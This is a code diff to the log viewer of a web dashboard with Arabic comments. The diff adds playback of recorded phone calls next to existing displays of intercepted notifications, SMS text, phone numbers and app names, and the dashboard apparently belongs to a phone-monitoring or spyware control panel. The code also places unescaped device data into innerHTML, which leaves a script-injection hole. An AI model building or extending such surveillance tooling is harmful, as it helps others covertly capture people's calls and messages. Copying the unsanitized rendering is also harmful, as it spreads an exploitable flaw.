@@ -436,16 +436,35 @@
               });
         }
 
-        function createLogItem(d){
+                function createLogItem(d){
             const div = document.createElement('div');
             div.className = "bg-slate-700 p-3 rounded-lg";
             let html = '';
-            html += `<div class="flex justify-between mb-1"><span class="text-white font-bold">${d.title || d.phone || d.app_name || 'غير معروف'}</span><span class="text-gray-400 text-[10px]">${d.timestamp ? new Date(d.timestamp.seconds * 1000).toLocaleString('ar') : ''}</span></div>`;
-            if(d.body || d.message || d.text) html += `<p class="text-gray-300 text-sm">${d.body || d.message || d.text}</p>`;
+            
+            // التحقق إذا كان الملف صوت
+            if(d.url && d.type === 'audio') {
+                 html += `<div class="flex justify-between mb-1">
+                     <span class="text-white font-bold">📞 مكالمة مسجلة</span>
+                     <span class="text-gray-400 text-[10px]">${d.timestamp ? new Date(d.timestamp).toLocaleString('ar') : ''}</span>
+                 </div>`;
+                 // مشغل الصوت
+                 html += `<audio controls class="w-full mt-2" style="height: 35px;">
+                     <source src="${d.url}" type="audio/3gp">
+                     متصفحك لا يدعم الصوت
+                 </audio>`;
+            } else {
+                // العرض العادي للمكالمات النصية
+                 html += `<div class="flex justify-between mb-1">
+                     <span class="text-white font-bold">${d.title || d.phone || d.app_name || 'غير معروف'}</span>
+                     <span class="text-gray-400 text-[10px]">${d.timestamp ? new Date(d.timestamp.seconds * 1000).toLocaleString('ar') : ''}</span>
+                 </div>`;
+                 if(d.body || d.message || d.text) html += `<p class="text-gray-300 text-sm">${d.body || d.message || d.text}</p>`;
+            }
+
             div.innerHTML = html;
             return div;
         }
-
+        
         function openAppManager(){
             openModal('modal-apps');
             log('Opening App Manager...', 'info');
